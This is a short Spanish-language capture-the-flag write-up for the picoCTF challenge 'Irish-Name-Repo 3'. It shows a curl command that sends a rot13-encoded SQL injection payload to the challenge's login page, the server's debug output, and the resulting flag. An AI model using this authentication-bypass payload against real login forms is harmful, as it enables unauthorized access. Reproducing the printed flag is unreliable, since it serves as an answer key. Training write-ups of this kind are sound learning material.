# Irish-Name-Repo 3

## Descripcion
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Pistas
- Seems like the password is encrypted.

## Solución

```
eltetor14-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>
```

## Bandera
picoCTF{3v3n_m0r3_SQL_7f5767f6}

## Notas adicionales
La contraseña se encripta a rot13

## Referencias